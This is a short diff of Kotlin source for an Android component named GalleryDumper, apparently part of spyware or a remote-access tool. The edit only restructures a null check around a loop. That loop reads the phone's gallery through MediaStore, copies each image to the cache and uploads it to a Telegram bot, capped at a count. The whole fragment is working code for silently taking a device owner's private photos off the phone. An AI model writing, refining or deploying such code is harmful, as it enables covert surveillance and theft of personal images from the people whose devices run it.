@@ -26,16 +26,18 @@ object GalleryDumper {
             )
 
             var sent = 0
-            cursor?.use {
-                while (it.moveToNext() && sent < count) {
-                    val path = it.getString(it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA))
-                    val name = it.getString(it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME))
-                    val file = File(path)
-                    if (file.exists()) {
-                        val copy = File(context.cacheDir, name)
-                        file.copyTo(copy, overwrite = true)
-                        TelegramBot.sendPhoto(copy, "🖼 $name")
-                        sent++
+            if (cursor != null) {
+                cursor.use {
+                    while (it.moveToNext() && sent < count) {
+                        val path = it.getString(it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA))
+                        val name = it.getString(it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME))
+                        val file = File(path)
+                        if (file.exists()) {
+                            val copy = File(context.cacheDir, name)
+                            file.copyTo(copy, overwrite = true)
+                            TelegramBot.sendPhoto(copy, "🖼 $name")
+                            sent++
+                        }
                     }
                 }
             }
